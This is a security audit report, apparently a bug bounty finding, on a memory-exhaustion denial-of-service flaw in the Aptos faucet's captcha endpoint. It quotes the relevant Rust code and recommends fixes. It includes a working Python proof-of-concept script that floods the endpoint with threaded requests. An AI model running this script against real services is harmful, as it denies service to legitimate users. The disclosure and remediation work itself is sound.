# Audit Report

## Title
Aptos Faucet Captcha Endpoint Susceptible to Memory Exhaustion DoS Attack Due to Missing Rate Limiting

## Summary
The `/request_captcha` endpoint lacks both documentation of security requirements and actual implementation of rate limiting, allowing an attacker to exhaust server memory by repeatedly requesting captchas without solving them. This vulnerability is explicitly acknowledged by developers in the codebase.

## Finding Description

The `/request_captcha` endpoint documentation fails to describe any security requirements or rate limits to prevent abuse. [1](#0-0) 

More critically, this documentation gap reflects a real implementation vulnerability: the endpoint has no rate limiting mechanism applied to it. When a captcha is requested, the `CaptchaManager` stores the challenge in an unbounded `HashMap<u32, String>` with no expiration mechanism. [2](#0-1) 

The developers have explicitly acknowledged this attack vector with a warning comment stating: "This could be attacked and cause the server to OOM because we don't throw out captchas info if it has been sitting there for too long / the map grows too large." [3](#0-2) 

Captcha challenges are only removed when successfully validated, meaning unsolved captchas persist indefinitely in memory. [4](#0-3) 

**Attack Path:**
1. Attacker makes repeated GET requests to `/request_captcha`
2. Each request generates a new random key and captcha image via `create_challenge()` [5](#0-4) 
3. Captcha data is inserted into the `challenges` HashMap with no size limit
4. Attacker never calls `/fund` with correct solutions, so captchas remain in memory
5. HashMap grows unbounded until the server runs out of memory
6. Faucet service crashes (OOM), denying service to legitimate users

Unlike the `/fund` endpoint which has comprehensive checker infrastructure including rate limiters, [6](#0-5)  the captcha endpoint bypasses all security checks and directly generates challenges. [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program's "API crashes" category. While the faucet is not a core blockchain consensus component, it is a critical developer infrastructure service for testnet token distribution. A successful attack would:

- Crash the faucet API service via memory exhaustion
- Deny testnet tokens to legitimate developers
- Disrupt developer onboarding and testing workflows
- Require service restart and potential debugging to identify the OOM cause

The OpenAPI specification acknowledges rate limiting exists conceptually (showing `RETRY-AFTER` headers in error responses), [8](#0-7)  but the implementation is absent for this endpoint.

## Likelihood Explanation

**Likelihood: HIGH**

This attack is trivial to execute:
- No authentication required (public endpoint)
- Simple HTTP GET requests
- No special tools or knowledge needed
- Fast execution (can generate thousands of captchas per second)
- Minimal attacker resources required

The developers' explicit warning comment indicates they are aware this is an unmitigated attack vector, suggesting the likelihood of exploitation is not theoretical but practical.

## Recommendation

Implement rate limiting for the `/request_captcha` endpoint and add expiration/cleanup for stale captchas:

**1. Apply existing rate limit checkers to the captcha endpoint** - Modify the endpoint to use the same checker infrastructure as `/fund`, or implement endpoint-specific rate limiting.

**2. Add captcha expiration** - Modify `CaptchaManager` to store timestamp with each challenge and periodically remove expired entries:
- Add a `created_at` timestamp to challenge entries
- Implement periodic cleanup task to remove captchas older than N minutes
- Add maximum HashMap size limit with LRU eviction

**3. Update documentation** - Document the rate limiting policy in the endpoint description to match the OpenAPI spec's `RETRY-AFTER` header semantics.

**4. Add monitoring** - Implement metrics for captcha HashMap size to detect potential attacks early.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
DoS PoC for Aptos Faucet /request_captcha endpoint
Demonstrates unbounded memory growth by requesting captchas without solving them
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

FAUCET_URL = "http://localhost:8081/v1/request_captcha"
NUM_THREADS = 10
REQUESTS_PER_THREAD = 1000

def request_captcha(thread_id):
    """Request captchas without solving them"""
    success = 0
    for i in range(REQUESTS_PER_THREAD):
        try:
            resp = requests.get(FAUCET_URL, timeout=5)
            if resp.status_code == 200:
                success += 1
                if i % 100 == 0:
                    print(f"Thread {thread_id}: {success} captchas generated")
        except Exception as e:
            print(f"Thread {thread_id}: Error - {e}")
            break
    return success

def main():
    print(f"Starting DoS attack on {FAUCET_URL}")
    print(f"Threads: {NUM_THREADS}, Requests/thread: {REQUESTS_PER_THREAD}")
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(request_captcha, i) for i in range(NUM_THREADS)]
        results = [f.result() for f in futures]
    
    elapsed = time.time() - start_time
    total = sum(results)
    
    print(f"\nCompleted in {elapsed:.2f}s")
    print(f"Total captchas generated: {total}")
    print(f"Rate: {total/elapsed:.2f} captchas/sec")
    print(f"\nAll captchas remain in memory - server will eventually OOM")

if __name__ == "__main__":
    main()
```

**Expected behavior:** The script successfully generates thousands of captchas that accumulate in the `CaptchaManager`'s HashMap, demonstrating unbounded memory growth. With sufficient requests, the faucet service will crash due to OOM.

## Notes

This finding directly addresses the security question about whether endpoint documentation adequately describes security requirements and rate limits. The answer is definitively **NO** - neither the inline documentation nor the OpenAPI specification adequately describe the security requirements, and critically, the actual rate limiting implementation is completely absent. The developers' own warning comment confirms this is a known but unresolved vulnerability.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L27-38)
```rust
    /// Initiate captcha flow
    ///
    /// With this endpoint you can initiate a captcha flow. The response will
    /// contain an image (the captcha to solve) in the body and a code in the
    /// header that you must include in the call to `/fund`. This endpoint is
    /// only relevant if the CaptchaChecker is enabled.
    #[oai(
        path = "/request_captcha",
        method = "get",
        operation_id = "request_captcha",
        response_header(name = "CAPTCHA_KEY", ty = "u32", description = "Captcha key"),
        tag = "ApiTags::Captcha"
```

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-58)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
        let mut captcha_manager = self.captcha_manager.lock().await;
        let (key, image) = match captcha_manager.create_challenge() {
            Ok((key, image)) => (key, image),
            Err(e) => {
                return Err(
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError).into(),
                );
            },
        };
        Ok(Response::new(Binary(image)).header(CAPTCHA_KEY, key))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L125-131)
```rust
#[derive(Debug, Default)]
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L142-162)
```rust
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Generate a random key.
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);

        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

        // Store the captcha information.
        self.challenges.insert(key, name);

        // Return (key, <captcha as base64>).
        Ok((key, image))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L164-177)
```rust
    /// Check a captcha challenge. Returns true if the captcha is correct.
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L261-270)
```rust
        // Ensure request passes checkers.
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```

**File:** crates/aptos-faucet/doc/spec.yaml (L92-96)
```yaml
            RETRY-AFTER:
              deprecated: false
              schema:
                type: integer
                format: uint64
```
